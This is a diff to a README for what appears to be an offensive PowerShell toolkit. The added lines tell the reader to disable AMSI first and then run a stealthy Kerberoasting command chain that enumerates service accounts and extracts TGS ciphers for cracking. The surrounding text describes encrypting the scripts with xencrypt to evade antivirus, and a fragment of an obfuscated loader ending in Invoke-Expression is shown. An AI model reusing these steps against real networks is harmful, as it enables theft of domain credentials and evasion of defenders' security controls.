@@ -21,6 +21,13 @@ Next I've already taken both of these files and encrypted them using xencrypt wi
 
 Xencrypt - [https://github.com/the-xentropy/xencrypt] (https://github.com/the-xentropy/xencrypt)
 
+You can simply copy and paste both of the below scripts into a powershell window - make sure you run a AMSI BYPASS FIRST!!
+Once done run the following:
+
+```
+Find-PotentiallyCrackableAccounts -Stealth -GetSPNs | Get-TGSCipher
+```
+
 Here is the outcome of the file enueration scripts "Find-PotentiallyCrackableAccounts.ps1":
 
 ```
@@ -43,6 +50,7 @@ $mwzq.Close()
 $jdxcbw.Close()
 Invoke-Expression($nvnhppd)
 ```
+
 
 
 Here is the outcome of the TGS Cipher extraction "Get-TGSCipher.ps1"
